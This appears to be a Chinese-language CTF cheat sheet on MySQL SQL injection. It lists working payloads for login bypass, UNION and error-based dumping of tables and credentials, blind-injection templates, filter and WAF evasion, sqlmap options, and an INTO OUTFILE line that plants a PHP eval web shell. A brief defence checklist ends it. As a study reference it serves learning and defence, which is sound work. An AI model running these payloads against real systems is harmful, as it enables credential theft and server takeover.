# SQL 注入速查（CTF 向）

## 1. 注入分类与判断

- 联合查询（UNION）、报错（error-based）、布尔盲注、时间盲注、堆叠（stacked）、二次注入。
- 判断：`'` 报错、`and 1=1/1=2` 差异、`sleep(3)` 延迟、`' order by N--` 测列数。

## 2. 万能密码与绕过

```
admin'--        admin' or 1=1--        " or ""="
绕过滤：or → ||  /  and → &&   空格 → /**/  %09  %0a
= 过滤 → like / regexp / <>!   引号过滤 → 十六进制 0x61646d696e
```

## 3. UNION 注入流程（MySQL）

```sql
' order by 3--+                    -- 测列数
' union select 1,2,3--+            -- 找回显位
' union select 1,database(),version()--
' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--
' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--
' union select 1,2,(select group_concat(user,0x3a,pass) from users)--
```

## 4. 报错注入（无回显位）

```sql
' and extractvalue(1,concat(0x7e,(select database())))--
' and updatexml(1,concat(0x7e,(select database())),1)--
' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--
```
- extractvalue/updatexml 报错长度上限 32 字符 → `substr(...,1,31)` 分段读。

## 5. 盲注模板

```sql
布尔：' and ascii(substr(database(),1,1))>97--
时间：' and if(ascii(substr((select table_name from information_schema.tables limit 1),1,1))>97,sleep(3),0)--
```
- 脚本化：二分法逐字符，注意 `>=`/`<=` 边界、`limit i,1` 偏移、列数与表名前缀。

## 6. 写文件与 RCE（需条件）

```sql
' union select 1,'<?php eval($_GET[0]);?>',3 into outfile '/var/www/html/shell.php'--
secure_file_priv 为 NULL 时写不了；值为目录时只能写该目录。
```

## 7. 堆叠注入（mysqli_multi_query / PDO 模拟预处理关）

```sql
'; handler users open as u; handler u close;--   -- MySQL 8 过滤 select 时的替代
```

## 8. 常见过滤与绕过

- 关键词过滤：大小写混写 `SeLeCt`、双写 `selselectect`、内联注释 `uni/**/on`。
- `information_schema` 被过滤：用 `mysql.innodb_table_stats`、`sys.schema_table_statistics`、
  无列名注入（`select (select group_concat(c) from (select 1 a,2 b,3 c union select * from users)x)`）。
- 宽字节注入：GBK 下 `%df'` 吃掉转义反斜杠。

## 9. 常用工具参数

```
sqlmap -u "URL" --batch --dbs --threads=8
sqlmap -r req.txt --level 3 --risk 2 --tamper=space2comment --technique=T
--cookie="..." --data="..." --second-url=...（二次注入）
```

## 10. 防御清单

预编译参数化（真实 prepare，不是字符串拼接）、最小权限 DB 账号、
错误信息不回显、输入白名单化、WAF 只是兜底不是防线。
